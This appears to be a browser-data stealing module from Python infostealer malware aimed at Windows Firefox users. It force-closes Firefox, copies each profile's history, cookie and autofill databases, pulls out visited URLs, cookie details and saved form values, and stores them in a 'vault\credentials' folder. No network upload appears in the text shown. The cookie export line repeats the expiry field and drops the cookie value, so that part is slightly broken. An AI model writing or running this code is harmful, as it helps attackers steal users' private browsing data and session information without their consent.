import threading
import os, shutil, subprocess, random, sqlite3

def firefoxing():
    subprocess.run('taskkill /f /im firefox.exe', shell=True)
    
    def random_filename(extension: str) -> str:
        return f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))}.{extension}"

    def get_firefox_profiles():
        appdata = os.getenv('APPDATA')
        firefox_profiles_path = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
        profiles = []
        if not os.path.exists(firefox_profiles_path):
            return profiles
        for profile_dir in os.listdir(firefox_profiles_path):
            profile_path = os.path.join(firefox_profiles_path, profile_dir)
            if os.path.isdir(profile_path):
                profiles.append(profile_path)
        return profiles

    def get_firefox_history(profile_path):
        history_db_path = os.path.join(profile_path, 'places.sqlite')
        if not os.path.exists(history_db_path):
            return ""
        result = ""
        temp_history_db = os.path.join(os.getenv('TEMP'), random_filename('places.sqlite'))
        shutil.copy(history_db_path, temp_history_db)
        conn = sqlite3.connect(temp_history_db)
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC')
        for row in cursor.fetchall():
            url = row[0]
            if 'mozilla.org' not in url:
                result += f"URL: {url}\nTitle: {row[1]}\nVisit Count: {row[2]}\n"
                result += "-----------------------------------------------------------\n"
        conn.close()
        os.remove(temp_history_db)
        return result

    def get_firefox_cookies(profile_path):
        cookies_db_path = os.path.join(profile_path, 'cookies.sqlite')
        if not os.path.exists(cookies_db_path):
            return ""
        result = ""
        temp_cookies_db = os.path.join(os.getenv('TEMP'), random_filename('cookies.sqlite'))
        shutil.copy(cookies_db_path, temp_cookies_db)
        try:
            conn = sqlite3.connect(temp_cookies_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host, path, expiry, name, value FROM moz_cookies")
            for row in cursor.fetchall():
                host = row[0]
                path = row[1]
                expiry = row[2]
                cookie_name = row[3]
                cookie_value = row[4]
                result += f"{host}\tTRUE\t{path}\t{expiry}\t{expiry}\t{cookie_name}\n"
            conn.close()
        except sqlite3.Error:
            pass
        finally:
            os.remove(temp_cookies_db)
        return result

    def get_firefox_autofill(profile_path):
        autofill_db_path = os.path.join(profile_path, "formhistory.sqlite")
        if not os.path.exists(autofill_db_path):
            return ""
        result = ""
        temp_autofill_db = os.path.join(os.getenv('TEMP'), random_filename('formhistory.sqlite'))
        shutil.copy(autofill_db_path, temp_autofill_db)
        try:
            conn = sqlite3.connect(temp_autofill_db)
            cursor = conn.cursor()
            cursor.execute("SELECT fieldname, value FROM moz_formhistory;")
            autofill_data = cursor.fetchall()
            for name, value in autofill_data:
                result += f"Name: {name.strip()}\nValue: {value.strip()}\n{'-'*50}\n"
            conn.close()
        except sqlite3.Error:
            pass
        finally:
            os.remove(temp_autofill_db)
        return result

    appdata = os.getenv('APPDATA')
    vault_dir = os.path.join(appdata, 'vault', 'credentials', 'firefox')
    os.makedirs(vault_dir, exist_ok=True)

    profiles = get_firefox_profiles()

    history_data = ""
    cookies_data = ""
    autofill_data = ""

    def fetch_history(profile):
        nonlocal history_data
        history_data += get_firefox_history(profile)

    def fetch_cookies(profile):
        nonlocal cookies_data
        cookies_data += get_firefox_cookies(profile)

    def fetch_autofill(profile):
        nonlocal autofill_data
        autofill_data += get_firefox_autofill(profile)

    threads = []
    for profile in profiles:
        thread_history = threading.Thread(target=fetch_history, args=(profile,))
        thread_cookies = threading.Thread(target=fetch_cookies, args=(profile,))
        thread_autofill = threading.Thread(target=fetch_autofill, args=(profile,))
        
        threads.extend([thread_history, thread_cookies, thread_autofill])

        thread_history.start()
        thread_cookies.start()
        thread_autofill.start()

    for thread in threads:
        thread.join()

    if history_data:
        with open(os.path.join(vault_dir, 'firefoxhistory.txt'), 'w', encoding='utf-8') as file:
            file.write(history_data)

    if cookies_data:
        with open(os.path.join(vault_dir, 'firefoxcookies.txt'), 'w', encoding='utf-8') as file:
            file.write(cookies_data)

    if autofill_data:
        with open(os.path.join(vault_dir, 'firefoxautofill.txt'), 'w', encoding='utf-8') as file:
            file.write(autofill_data)